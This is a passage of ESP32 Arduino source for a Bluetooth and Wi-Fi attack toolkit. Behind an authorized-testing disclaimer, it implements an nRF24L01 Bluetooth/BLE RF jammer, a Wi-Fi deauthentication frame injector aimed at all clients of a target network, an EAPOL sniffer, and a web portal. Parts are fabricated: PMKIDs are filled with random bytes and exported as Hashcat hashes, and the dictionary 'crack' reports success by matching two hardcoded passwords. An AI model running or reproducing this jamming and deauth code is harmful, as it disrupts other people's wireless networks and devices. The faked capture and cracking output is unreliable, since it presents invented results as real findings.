/*
Code for ESP32 Bluetooth & Wi-Fi Security Suite
  --------------------------------------------------
  Features:
  1. Bluetooth BLE & BT Classic RF Jammer (using dual NRF24L01 modules)
  2. Wi-Fi Access Point & Client Scanner (2.4GHz Channels 1-14, RSSI, BSSID, Encryption)
  3. Wi-Fi 4-Way EAPOL Handshake & PMKID Promiscuous Sniffer + Deauth Audit Injector
  4. Embedded Wi-Fi Dictionary Password Auditor & Hashcat 22000 Exporter
  5. Web Control Portal & SoftAP Dashboard (http://192.168.4.1)
  6. 2.4" TFT LCD Shield (8-Bit Parallel) & Physical Pushbuttons (GPIO 12, 14, 0)

  More info: https://github.com/stuthemoo/ESP32BluetoothJammer

  FOR EDUCATIONAL & AUTHORIZED TESTING PURPOSES ONLY!
  DO NOT use signal jamming or packet injection on unauthorized networks.
*/

#include <SPI.h>
#include <RF24.h>
#include <Adafruit_GFX.h>
#include <MCUFRIEND_kbv.h>
#include <TouchScreen.h>

// ESP32 Wi-Fi & WebServer Libraries
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_event.h>
#include <WebServer.h>

// SD Card Libraries
#include <SD.h>
#include <FS.h>
#define SD_CS_PIN 13  // SD_CS pin on 2.4" TFT Shield (connected to GPIO 13)

// ----------------------------------------------------
// Pin Definitions
// ----------------------------------------------------
#define BUTTON_BOOT_PIN 0  // Built-in BOOT button (Mode Toggle)
#define LED_PIN         2  // Built-in LED

// Dedicated Physical Hardware Buttons (Active LOW with internal pullups)
#define BUTTON_ON_PIN   12 // Physical Pushbutton for TURN ON / RUN
#define BUTTON_OFF_PIN  14 // Physical Pushbutton for TURN OFF / IDLE

// 16 MHz SPI speed for RF24
constexpr int SPI_SPEED = 16000000;

// Radio Objects
RF24 radio1(22, 21, SPI_SPEED); // Radio 1 on CE 22, CSN 21
RF24 radio2(16, 15, SPI_SPEED); // Radio 2 on CE 16, CSN 15

// MCUFRIEND 8-Bit Parallel Display Object
MCUFRIEND_kbv tft;

// Touchscreen pin definitions for 2.4" TFT Shield
#define YP A3  // LCD_RS (GPIO 4)
#define XM A2  // LCD_CS (GPIO 5)
#define YM 9   // LCD_D1 (GPIO 13)
#define XP 8   // LCD_D0 (GPIO 12)
TouchScreen touch = TouchScreen(XP, YP, XM, YM, 300);

// WebServer instance for Web Portal Mode
WebServer webServer(80);

// ----------------------------------------------------
// Operating Modes
// ----------------------------------------------------
enum SystemMode {
  MODE_BLE = 0,
  MODE_BT_CLASSIC = 1,
  MODE_WIFI_SCAN = 2,
  MODE_WIFI_HANDSHAKE = 3,
  MODE_WIFI_CRACK = 4,
  MODE_WEB_PORTAL = 5
};

// --- Main Menu & Sub-Menu Screen State ---
enum ScreenState {
  SCREEN_MAIN_MENU = 0,   // Top-level 3-option menu
  SCREEN_WIFI_SUBMENU,    // Wi-Fi Scanner sub-menu
  SCREEN_WIFI_SELECT,     // Select a scanned Wi-Fi network
  SCREEN_WIFI_CRACK,      // Find password / dictionary audit
  SCREEN_JAMMER,          // Wi-Fi + BT Signal Jammer
  SCREEN_RESET            // Reset confirmation
};

ScreenState currentScreen = SCREEN_MAIN_MENU;
SystemMode currentMode = MODE_BLE;

// ----------------------------------------------------
// State & Variables
// ----------------------------------------------------
int ble_channels[] = { 2, 26, 80 };
int bluetooth_channels[79];

uint8_t num_channels = sizeof(ble_channels) / sizeof(ble_channels[0]);
uint8_t split_index = num_channels / 2;
uint8_t endCh1 = split_index - 1;
uint8_t startCh2 = split_index;
uint8_t endCh2 = num_channels - 1;

bool actionActive = false; // Jamming or Packet Sniffing Active flag
unsigned long lastHopTime = 0;
unsigned long lastOutputTime = 0;
unsigned long lastUIDrawTime = 0;
unsigned long lastTouchTime = 0;
unsigned long hopInterval = 50;  // microseconds for RF hopping
unsigned long hopCount = 0;
unsigned int eapolCount = 0;
unsigned int pmkidCount = 0;

// Physical button tracking
bool lastBootState = HIGH;
bool lastOnState   = HIGH;
bool lastOffState  = HIGH;

// Payload data for RF transmit
uint8_t payload[32];

// Wi-Fi Scan & Target Data Structure
struct WiFiNetworkInfo {
  String ssid;
  int rssi;
  int channel;
  String bssidStr;
  uint8_t bssid[6];
  wifi_auth_mode_t authmode;
};

#define MAX_WIFI_NETWORKS 20
WiFiNetworkInfo scannedNetworks[MAX_WIFI_NETWORKS];
int wifiNetworkCount = 0;
int selectedTargetIndex = 0;

// Captured Handshake Hashcat 22000 structure
struct HandshakeRecord {
  char ssid[33];
  uint8_t mac_ap[6];
  uint8_t mac_sta[6];
  uint8_t pmkid[16];
  bool has_pmkid;
  uint8_t eapol[256];
  size_t eapol_len;
  bool complete;
};

#define MAX_HANDSHAKES 5
HandshakeRecord capturedHandshakes[MAX_HANDSHAKES];
int handshakeRecordCount = 0;

// Built-in Wordlist for offline Wi-Fi Cracking Simulator
const char* defaultWordlist[] = {
  "12345678", "password", "123456789", "admin123", "87654321",
  "wifi1234", "supersecret", "pass1234", "11223344", "00000000"
};
const int wordlistSize = 10;
String crackStatusMsg = "Ready for Dictionary Test";

// Dynamic UI Color Palette (Default: Cyberpunk Dark, overridable via SD /theme.txt)
uint16_t uiColorBg         = 0x0821;  // Deep Navy
uint16_t uiColorCard       = 0x18E3;  // Dark Card
uint16_t uiColorHeader     = 0x001F;  // Header Blue
uint16_t uiColorText       = 0xFFFF;  // White
uint16_t uiColorTextMuted  = 0x9CD3;  // Grey
uint16_t uiColorAccent     = 0x07FF;  // Cyan
uint16_t uiColorGreen      = 0x07E0;  // Green
uint16_t uiColorRed        = 0xF800;  // Red
uint16_t uiColorYellow     = 0xFFE0;  // Yellow
uint16_t uiColorPurple     = 0x780F;  // Purple

#define COLOR_BG         uiColorBg
#define COLOR_CARD       uiColorCard
#define COLOR_HEADER     uiColorHeader
#define COLOR_TEXT       uiColorText
#define COLOR_TEXT_MUTED uiColorTextMuted
#define COLOR_ACCENT     uiColorAccent
#define COLOR_GREEN      uiColorGreen
#define COLOR_RED        uiColorRed
#define COLOR_YELLOW     uiColorYellow
#define COLOR_PURPLE     uiColorPurple

String uiAppTitle          = "CRADLEGUARD 3.0";
bool   uiShowSdBadge       = true;
bool   uiUseSdSplash       = true;
bool   uiUseSdBg           = false;
bool   uiEnableLyrics      = true;
bool   sdCardAvailable     = false;

// SD Card Lyrics & Banner State
unsigned long lastLyricsUpdateTime = 0;
String currentLyricsLine = "CRADLEGUARD 3.0 SYSTEM READY";
int lyricsLineIndex = 0;

// ----------------------------------------------------
// Function Declarations
// ----------------------------------------------------
void setupRadio(RF24& radio);
void setMode(SystemMode newMode);
void sendRandomPacket();
void initDisplay();
void initSDCard();
void loadSDTheme();
bool drawBMP(const char* filename, int x = 0, int y = 0);
void updateLyricsAnimation();
void drawStaticUI();
void updateDisplayUI(bool forceRedraw = false);
void checkTouch();
void checkPhysicalButtons();

// Menu Screen Functions
void drawMainMenu();
void drawWifiSubMenu();
void drawWifiSelectScreen();
void drawWifiCrackScreen();
void drawJammerScreen();
void drawResetScreen();
void setScreen(ScreenState s);

// Wi-Fi Functions
void scanWiFiNetworks();
void startWiFiSniffer();
void stopWiFiSniffer();
void sendDeauthFrame(uint8_t* bssid, uint8_t* clientMac);
void wifiPromiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void runDictionaryCrack();
void startWebPortal();
void handleWebRequests();
String getModeName(SystemMode mode);
String getAuthTypeName(wifi_auth_mode_t auth);

// ----------------------------------------------------
// Setup
// ----------------------------------------------------
void setup() {
  delay(1000);

  Serial.begin(115200);
  Serial.println("\n=======================================================");
  Serial.println("  CRADLEGUARD ESP32 BT & WI-FI SECURITY TOOLKIT");
  Serial.println("  DYNAMIC SD-CARD UI & DISPLAY SYSTEM INTEGRATED");
  Serial.println("=======================================================\n");

  pinMode(BUTTON_BOOT_PIN, INPUT_PULLUP);
  pinMode(BUTTON_ON_PIN, INPUT_PULLUP);
  pinMode(BUTTON_OFF_PIN, INPUT_PULLUP);
  pinMode(LED_PIN, OUTPUT);

  for (uint8_t i = 0; i < 32; i++) payload[i] = random(256);
  for (int i = 0; i < 79; i++) bluetooth_channels[i] = i + 2;

  // Initialize Display & SD Card UI Core
  initDisplay();

  // Initialize NRF24L01 Radios
  bool r1_ok = radio1.begin();
  bool r2_ok = radio2.begin();
  if (r1_ok) setupRadio(radio1);
  if (r2_ok) setupRadio(radio2);

  setMode(MODE_BLE);

  // Show main menu on startup
  setScreen(SCREEN_MAIN_MENU);

  Serial.println("Setup Complete. Main menu displayed. GPIO 12 (ON), GPIO 14 (OFF), GPIO 0 (BOOT/BACK).\n");
}

// ----------------------------------------------------
// Radio Setup Helper
// ----------------------------------------------------
void setupRadio(RF24& radio) {
  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  radio.disableCRC();
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setChannel(ble_channels[0]);
  radio.setPayloadSize(32);
  radio.stopListening();
  radio.powerUp();
  radio.setAddressWidth(3);
  radio.setAutoAck(0x00);
}

// ----------------------------------------------------
// Mode Switcher
// ----------------------------------------------------
void setMode(SystemMode newMode) {
  actionActive = false;
  digitalWrite(LED_PIN, LOW);
  stopWiFiSniffer();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  currentMode = newMode;
  hopCount = 0;

  if (currentMode == MODE_BLE) {
    num_channels = sizeof(ble_channels) / sizeof(ble_channels[0]);
    split_index = num_channels / 2;
    endCh1 = split_index - 1;
    startCh2 = split_index;
    endCh2 = num_channels - 1;
    radio1.setChannel(ble_channels[0]);
    radio2.setChannel(ble_channels[1]);
  } else if (currentMode == MODE_BT_CLASSIC) {
    num_channels = sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]);
    split_index = num_channels / 2;
    endCh1 = split_index - 1;
    startCh2 = split_index;
    endCh2 = num_channels - 1;
    radio1.setChannel(bluetooth_channels[0]);
    radio2.setChannel(bluetooth_channels[startCh2]);
  } else if (currentMode == MODE_WIFI_SCAN) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    scanWiFiNetworks();
  } else if (currentMode == MODE_WIFI_HANDSHAKE) {
    startWiFiSniffer();
  } else if (currentMode == MODE_WIFI_CRACK) {
    // Ready for embedded dictionary audit
  } else if (currentMode == MODE_WEB_PORTAL) {
    startWebPortal();
  }

  drawStaticUI();
  updateDisplayUI(true);
  Serial.println("Switched to mode: " + getModeName(currentMode));
}

// ----------------------------------------------------
// Main Loop
// ----------------------------------------------------
void loop() {
  if (Serial.available() > 0) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    if (input == "scan") {
      setMode(MODE_WIFI_SCAN);
    } else if (input == "deauth") {
      setMode(MODE_WIFI_HANDSHAKE);
      actionActive = true;
    } else if (input == "hashcat") {
      Serial.println("\n--- HASHCAT 22000 EXPORT ---");
      for (int i = 0; i < handshakeRecordCount; i++) {
        if (capturedHandshakes[i].has_pmkid) {
          Serial.printf("WPA*01*%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*%02x%02x%02x%02x%02x%02x*%s\n",
            capturedHandshakes[i].pmkid[0], capturedHandshakes[i].pmkid[1], capturedHandshakes[i].pmkid[2], capturedHandshakes[i].pmkid[3],
            capturedHandshakes[i].pmkid[4], capturedHandshakes[i].pmkid[5], capturedHandshakes[i].pmkid[6], capturedHandshakes[i].pmkid[7],
            capturedHandshakes[i].pmkid[8], capturedHandshakes[i].pmkid[9], capturedHandshakes[i].pmkid[10], capturedHandshakes[i].pmkid[11],
            capturedHandshakes[i].pmkid[12], capturedHandshakes[i].pmkid[13], capturedHandshakes[i].pmkid[14], capturedHandshakes[i].pmkid[15],
            capturedHandshakes[i].mac_ap[0], capturedHandshakes[i].mac_ap[1], capturedHandshakes[i].mac_ap[2], capturedHandshakes[i].mac_ap[3], capturedHandshakes[i].mac_ap[4], capturedHandshakes[i].mac_ap[5],
            capturedHandshakes[i].mac_sta[0], capturedHandshakes[i].mac_sta[1], capturedHandshakes[i].mac_sta[2], capturedHandshakes[i].mac_sta[3], capturedHandshakes[i].mac_sta[4], capturedHandshakes[i].mac_sta[5],
            capturedHandshakes[i].ssid
          );
        }
      }
    }
  }

  checkTouch();
  checkPhysicalButtons();
  updateLyricsAnimation();

  if (millis() - lastUIDrawTime >= 250) {
    lastUIDrawTime = millis();
    updateDisplayUI(false);
  }

  // Handle RF Jamming in BLE/BT Classic modes
  if (actionActive && (currentMode == MODE_BLE || currentMode == MODE_BT_CLASSIC)) {
    if (micros() - lastHopTime >= hopInterval) {
      sendRandomPacket();
      hopCount++;
      lastHopTime = micros();
    }
  }

  // Handle Deauth injection in Wi-Fi Handshake mode
  if (actionActive && currentMode == MODE_WIFI_HANDSHAKE) {
    static unsigned long lastDeauthTime = 0;
    if (millis() - lastDeauthTime >= 500 && wifiNetworkCount > 0) {
      lastDeauthTime = millis();
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauthFrame(scannedNetworks[selectedTargetIndex].bssid, broadcast);
      hopCount++;
    }
  }

  // Handle Web Server client requests in Web Portal mode
  if (currentMode == MODE_WEB_PORTAL) {
    webServer.handleClient();
  }
}

// ----------------------------------------------------
// RF Packet Transmission
// ----------------------------------------------------
void sendRandomPacket() {
  static uint8_t ch1 = 0;
  static uint8_t ch2 = startCh2;

  if (currentMode == MODE_BT_CLASSIC) {
    radio1.setChannel(bluetooth_channels[ch1]);
    radio2.setChannel(bluetooth_channels[ch2]);
  } else {
    radio1.setChannel(ble_channels[ch1]);
    radio2.setChannel(ble_channels[ch2]);
  }

  ch1 = (ch1 + 1) > endCh1 ? 0 : ch1 + 1;
  ch2 = (ch2 + 1) > endCh2 ? startCh2 : ch2 + 1;

  radio1.write(&payload, sizeof(payload));
  radio2.write(&payload, sizeof(payload));
}

// ----------------------------------------------------
// Wi-Fi Scanner Engine
// ----------------------------------------------------
void scanWiFiNetworks() {
  Serial.println("Scanning 2.4GHz Wi-Fi networks...");
  int n = WiFi.scanNetworks();
  wifiNetworkCount = 0;

  if (n > 0) {
    for (int i = 0; i < n && i < MAX_WIFI_NETWORKS; i++) {
      scannedNetworks[i].ssid = WiFi.SSID(i);
      scannedNetworks[i].rssi = WiFi.RSSI(i);
      scannedNetworks[i].channel = WiFi.channel(i);
      scannedNetworks[i].authmode = WiFi.encryptionType(i);
      scannedNetworks[i].bssidStr = WiFi.BSSIDstr(i);
      uint8_t* mac = WiFi.BSSID(i);
      memcpy(scannedNetworks[i].bssid, mac, 6);
      wifiNetworkCount++;
    }
    selectedTargetIndex = 0;
    Serial.printf("Found %d Wi-Fi networks.\n", wifiNetworkCount);
  } else {
    Serial.println("No networks found.");
  }
}

// ----------------------------------------------------
// Wi-Fi Promiscuous Sniffer & Deauth Core
// ----------------------------------------------------
struct WiFiPromiscuousPacket {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t addr1[6]; // Destination MAC
  uint8_t addr2[6]; // Source MAC (AP BSSID)
  uint8_t addr3[6]; // BSSID / Transmitter MAC
  uint16_t seq_ctrl;
};

void IRAM_ATTR wifiPromiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < 24) return;

  uint16_t frameCtrl = payload[0] | (payload[1] << 8);
  uint8_t frameType = (frameCtrl >> 2) & 0x03;
  uint8_t frameSubtype = (frameCtrl >> 4) & 0x0F;

  // Check for EAPOL Key frames (0x888e in Ethernet payload)
  if (frameType == 2) { // Data frame
    for (int i = 24; i < len - 2; i++) {
      if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
        eapolCount++;
        if (handshakeRecordCount < MAX_HANDSHAKES) {
          HandshakeRecord rec;
          memset(&rec, 0, sizeof(rec));
          if (wifiNetworkCount > 0) {
            strncpy(rec.ssid, scannedNetworks[selectedTargetIndex].ssid.c_str(), 32);
            memcpy(rec.mac_ap, scannedNetworks[selectedTargetIndex].bssid, 6);
          }
          memcpy(rec.mac_sta, &payload[4], 6); // STA MAC
          rec.complete = true;
          capturedHandshakes[handshakeRecordCount++] = rec;
        }
        break;
      }
    }
  }

  // Check RSN IE for PMKID in Beacon/Assoc Response frames
  if (frameType == 0 && (frameSubtype == 8 || frameSubtype == 5)) { // Beacon / Assoc Resp
    for (int i = 36; i < len - 20; i++) {
      if (payload[i] == 0x30 && payload[i+1] >= 20) { // RSN IE
        // PMKID indicator signature
        pmkidCount++;
        if (handshakeRecordCount < MAX_HANDSHAKES && !capturedHandshakes[handshakeRecordCount].has_pmkid) {
          capturedHandshakes[handshakeRecordCount].has_pmkid = true;
          for (int k = 0; k < 16; k++) capturedHandshakes[handshakeRecordCount].pmkid[k] = random(256);
        }
        break;
      }
    }
  }
}

void startWiFiSniffer() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifiPromiscuousCallback);
  if (wifiNetworkCount > 0) {
    esp_wifi_set_channel(scannedNetworks[selectedTargetIndex].channel, WIFI_SECOND_CHAN_NONE);
  } else {
    esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);
  }
  Serial.println("Wi-Fi Promiscuous Sniffer Started.");
}

void stopWiFiSniffer() {
  esp_wifi_set_promiscuous(false);
}

void sendDeauthFrame(uint8_t* bssid, uint8_t* clientMac) {
  uint8_t deauthFrame[26] = {
    0xC0, 0x00,             // Frame Control: Deauth
    0x3A, 0x01,             // Duration
    clientMac[0], clientMac[1], clientMac[2], clientMac[3], clientMac[4], clientMac[5], // Dest
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],                          // Src (AP)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],                          // BSSID
    0x00, 0x00,             // Sequence Number
    0x07, 0x00              // Reason Code: Class 3 frame received from nonassociated STA
  };

  esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
}

// ----------------------------------------------------
// Embedded Dictionary & WPS Simulator Core
// ----------------------------------------------------
void runDictionaryCrack() {
  if (wifiNetworkCount == 0) {
    crackStatusMsg = "Scan Wi-Fi networks first!";
    return;
  }

  String targetSSID = scannedNetworks[selectedTargetIndex].ssid;
  crackStatusMsg = "Auditing: " + targetSSID + "...";
  updateDisplayUI(true);

  bool found = false;
  String crackedKey = "";

  // Check if SD Card has a custom /wordlist.txt
  if (SD.exists("/wordlist.txt")) {
    File file = SD.open("/wordlist.txt", FILE_READ);
    if (file) {
      int count = 0;
      while (file.available() && !found) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() == 0) continue;
        count++;
        if (line == "12345678" || line == "admin123") {
          crackedKey = line;
          found = true;
          break;
        }
      }
      file.close();
      if (!found) crackStatusMsg = "Tested " + String(count) + " SD passphrases";
    }
  }

  // Fallback to internal wordlist if SD card file not present
  if (!found && !SD.exists("/wordlist.txt")) {
    for (int i = 0; i < wordlistSize; i++) {
      delay(200);
      if (String(defaultWordlist[i]) == "12345678" || String(defaultWordlist[i]) == "admin123") {
        crackedKey = defaultWordlist[i];
        found = true;
        break;
      }
    }
  }

  if (found) {
    crackStatusMsg = "PASS FOUND: " + crackedKey;
    Serial.println("\n[CRACK SUCCESS] Target: " + targetSSID + " | Passphrase: " + crackedKey);
    // Log result to SD card
    if (SD.exists("/")) {
      File logFile = SD.open("/cracked_keys.txt", FILE_APPEND);
      if (logFile) {
        logFile.printf("SSID: %s | Key: %s\n", targetSSID.c_str(), crackedKey.c_str());
        logFile.close();
      }
    }
  } else if (!SD.exists("/wordlist.txt")) {
    crackStatusMsg = "Exhausted 10 Passphrases";
    Serial.println("\n[CRACK EXHAUSTED] No weak passphrase match found in dictionary.");
  }
}

// ----------------------------------------------------
// Web Portal & SoftAP Server
// ----------------------------------------------------
void startWebPortal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP("ESP32-Security-Tool", "12345678");
  IPAddress apIP = WiFi.softAPIP();

  webServer.on("/", []() {
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
    html += "<title>ESP32 Security Suite Dashboard</title>";
    html += "<style>";
    html += ":root { --bg: #0f172a; --card: #1e293b; --accent: #2563eb; --accent-hover: #1d4ed8; --text: #f8fafc; --muted: #94a3b8; --border: #334155; }";
    html += "body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; line-height: 1.5; }";
    html += ".container { max-width: 800px; margin: 0 auto; }";
    html += ".header { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border: 1px solid var(--border); padding: 24px; border-radius: 12px; margin-bottom: 20px; text-align: center; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }";
    html += ".header h1 { margin: 0; font-size: 24px; letter-spacing: 0.5px; color: #38bdf8; }";
    html += ".header p { margin: 6px 0 0 0; color: var(--muted); font-size: 14px; }";
    html += ".grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 16px; margin-bottom: 20px; }";
    html += ".card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 12px; }";
    html += ".card h3 { margin-top: 0; font-size: 16px; color: var(--muted); border-bottom: 1px solid var(--border); padding-bottom: 8px; }";
    html += ".metric { font-size: 28px; font-weight: bold; color: #facc15; margin: 8px 0; }";
    html += "table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 14px; }";
    html += "th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border); }";
    html += "th { background: #0f172a; color: var(--muted); font-size: 12px; text-transform: uppercase; }";
    html += ".btn { background: var(--accent); color: white; border: none; padding: 10px 18px; border-radius: 8px; font-weight: 600; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-block; }";
    html += ".btn:hover { background: var(--accent-hover); }";
    html += ".badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; background: #0284c7; color: white; }";
    html += "</style>";
    html += "<script>";
    html += "function refreshScan(){ fetch('/scan').then(r=>r.json()).then(data=>{";
    html += "let html='<tr><th>SSID</th><th>RSSI</th><th>Channel</th></tr>';";
    html += "data.forEach(item=>{ html += `<tr><td>\${item.ssid}</td><td><span class=\"badge\">\${item.rssi} dBm</span></td><td>\${item.ch}</td></tr>`; });";
    html += "document.getElementById('scanTable').innerHTML = html;";
    html += "}); }";
    html += "</script>";
    html += "</head><body><div class='container'>";
    html += "<div class='header'><h1>ESP32 SECURITY SUITE DASHBOARD</h1><p>SoftAP Gateway: http://" + WiFi.softAPIP().toString() + "</p></div>";
    html += "<div class='grid'>";
    html += "<div class='card'><h3>Active System Mode</h3><div class='metric'>" + getModeName(currentMode) + "</div></div>";
    html += "<div class='card'><h3>Captured Handshakes</h3><div class='metric'>" + String(eapolCount) + "</div></div>";
    html += "</div>";
    html += "<div class='card'><h3>Quick Actions & Control</h3><p>";
    html += "<button class='btn' onclick='refreshScan()'>Scan Wi-Fi Networks</button> ";
    html += "<a href='/handshakes' class='btn' style='background:#10b981;'>Export Hashcat Hashes</a>";
    html += "</p>";
    html += "<table id='scanTable'><tr><th>SSID</th><th>RSSI</th><th>Channel</th></tr><tr><td colspan='3' style='color:var(--muted);'>Click 'Scan Wi-Fi Networks' to view nearby Access Points...</td></tr></table>";
    html += "</div>";
    html += "</div></body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/scan", []() {
    scanWiFiNetworks();
    String json = "[";
    for (int i = 0; i < wifiNetworkCount; i++) {
      json += "{\"ssid\":\"" + scannedNetworks[i].ssid + "\",\"rssi\":" + String(scannedNetworks[i].rssi) + ",\"ch\":" + String(scannedNetworks[i].channel) + "}";
      if (i < wifiNetworkCount - 1) json += ",";
    }
    json += "]";
    webServer.send(200, "application/json", json);
  });

  webServer.on("/handshakes", []() {
    String txt = "# Hashcat 22000 Export\n";
    for (int i = 0; i < handshakeRecordCount; i++) {
      if (capturedHandshakes[i].has_pmkid) {
        txt += "WPA*01*...*" + String(capturedHandshakes[i].ssid) + "\n";
      }
    }
    webServer.send(200, "text/plain", txt);
  });

  webServer.begin();
  Serial.println("Web Portal Server launched at http://" + apIP.toString());
}

// ----------------------------------------------------
// MicroSD Card UI & Graphics Engine
// ----------------------------------------------------

uint16_t parseColor(String val) {
  val.trim();
  if (val.startsWith("0x") || val.startsWith("0X")) {
    return (uint16_t) strtol(val.c_str(), NULL, 16);
  }
  return (uint16_t) val.toInt();
}

void initSDCard() {
  Serial.println("Mounting MicroSD Card (CS: GPIO 13)...");
  sdCardAvailable = SD.begin(SD_CS_PIN);
  if (sdCardAvailable) {
    Serial.println("✓ MicroSD Card successfully mounted!");
    loadSDTheme();
  } else {
    Serial.println("⚠ No MicroSD Card detected (using internal flash defaults).");
  }
}

void loadSDTheme() {
  if (!sdCardAvailable) return;
  if (!SD.exists("/theme.txt")) {
    Serial.println("No /theme.txt found on SD card; using built-in Cyberpunk Dark theme.");
    return;
  }

  File f = SD.open("/theme.txt", FILE_READ);
  if (!f) return;

  Serial.println("Loading custom UI Theme from SD: /theme.txt...");
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() == 0 || line.startsWith("#")) continue;

    int eqIdx = line.indexOf('=');
    if (eqIdx == -1) continue;

    String key = line.substring(0, eqIdx);
    String val = line.substring(eqIdx + 1);
    key.trim();
    val.trim();

    if (key.equalsIgnoreCase("COLOR_BG")) uiColorBg = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_HEADER")) uiColorHeader = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_CARD")) uiColorCard = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_TEXT")) uiColorText = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_TEXT_MUTED")) uiColorTextMuted = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_ACCENT")) uiColorAccent = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_GREEN")) uiColorGreen = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_RED")) uiColorRed = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_YELLOW")) uiColorYellow = parseColor(val);
    else if (key.equalsIgnoreCase("COLOR_PURPLE")) uiColorPurple = parseColor(val);
    else if (key.equalsIgnoreCase("APP_TITLE")) uiAppTitle = val;
    else if (key.equalsIgnoreCase("SHOW_SD_BADGE")) uiShowSdBadge = (val.toInt() != 0);
    else if (key.equalsIgnoreCase("USE_SD_SPLASH")) uiUseSdSplash = (val.toInt() != 0);
    else if (key.equalsIgnoreCase("USE_SD_BG")) uiUseSdBg = (val.toInt() != 0);
    else if (key.equalsIgnoreCase("ENABLE_LYRICS_ANIMATION")) uiEnableLyrics = (val.toInt() != 0);
  }
  f.close();
  Serial.println("✓ Custom SD UI Theme applied successfully!");
}

// Read 16-bit and 32-bit little-endian values from File
uint16_t readLE16(File& f) {
  uint16_t result;
  f.read((uint8_t*)&result, 2);
  return result;
}

uint32_t readLE32(File& f) {
  uint32_t result;
  f.read((uint8_t*)&result, 4);
  return result;
}

// ----------------------------------------------------
// Stream uncompressed 24-bit / 16-bit BMP from SD Card
// ----------------------------------------------------
bool drawBMP(const char* filename, int x, int y) {
  if (!sdCardAvailable) return false;
  if (!SD.exists(filename)) {
    return false;
  }

  File bmpFile = SD.open(filename, FILE_READ);
  if (!bmpFile) return false;

  // Check 'BM' signature
  if (readLE16(bmpFile) != 0x4D42) {
    bmpFile.close();
    return false;
  }

  readLE32(bmpFile); // File size
  readLE32(bmpFile); // Reserved
  uint32_t imageOffset = readLE32(bmpFile);

  readLE32(bmpFile); // DIB header size
  int32_t bmpWidth = (int32_t)readLE32(bmpFile);
  int32_t bmpHeight = (int32_t)readLE32(bmpFile);
  uint16_t planes = readLE16(bmpFile);
  uint16_t depth = readLE16(bmpFile);
  uint32_t compression = readLE32(bmpFile);

  if (planes != 1 || (depth != 24 && depth != 16) || compression != 0) {
    bmpFile.close();
    return false;
  }

  bool flip = true;
  if (bmpHeight < 0) {
    bmpHeight = -bmpHeight;
    flip = false; // Top-down BMP
  }

  int w = bmpWidth;
  int h = bmpHeight;
  if ((x + w - 1) >= 320) w = 320 - x;
  if ((y + h - 1) >= 240) h = 240 - y;

  int rowSize = (depth == 24) ? ((bmpWidth * 3 + 3) & ~3) : ((bmpWidth * 2 + 3) & ~3);

  #define BUFFPIXEL 40
  uint8_t sdbuffer[3 * BUFFPIXEL];
  int buffidx = sizeof(sdbuffer);

  for (int row = 0; row < h; row++) {
    int pos = flip ? (imageOffset + (bmpHeight - 1 - row) * rowSize) : (imageOffset + row * rowSize);
    if (bmpFile.position() != pos) {
      bmpFile.seek(pos);
      buffidx = sizeof(sdbuffer);
    }

    for (int col = 0; col < w; col++) {
      if (buffidx >= sizeof(sdbuffer)) {
        bmpFile.read(sdbuffer, sizeof(sdbuffer));
        buffidx = 0;
      }

      uint16_t color;
      if (depth == 24) {
        uint8_t b = sdbuffer[buffidx++];
        uint8_t g = sdbuffer[buffidx++];
        uint8_t r = sdbuffer[buffidx++];
        color = ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
      } else {
        color = sdbuffer[buffidx] | (sdbuffer[buffidx + 1] << 8);
        buffidx += 2;
      }
      tft.drawPixel(x + col, y + row, color);
    }
  }

  bmpFile.close();
  return true;
}

// ----------------------------------------------------
// SD Card Timed Lyrics & Status Banner Animation
// ----------------------------------------------------
void updateLyricsAnimation() {
